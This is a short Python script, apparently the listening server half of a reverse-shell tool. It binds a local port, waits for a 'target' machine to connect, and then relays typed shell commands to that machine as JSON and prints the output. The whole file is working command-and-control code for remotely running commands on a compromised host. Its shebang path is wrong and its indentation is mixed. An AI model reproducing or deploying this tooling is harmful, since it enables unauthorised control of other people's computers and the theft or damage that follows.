#!/usr/share/python3
# SOCKET
#       BIND
#           LISTEN
#                 ACCEPT

import socket
import json

def reliable_send(data):
	json_data = json.dumps(data).encode()
	target.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024).decode()
			return json.loads(json_data)
		except ValueError:
			continue

def shell():
	while True:
		command = input("* Shell#~%s: " % str(ip)) # %s outputs the IP of target 
		reliable_send(command)
		if command == "q":
                	break
		elif command[:2] == "cd":
					continue
		else:
				result = reliable_recv()
				print (result)

def server ():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("127.0.0.1",54321))  #ip of host + desired port
	s.listen(5)
	print ("LISTENING FOR INCOMING CONNECTIONS")
	target, ip = s.accept()
	print ("Target connected!")

server()
shell()
s.close()
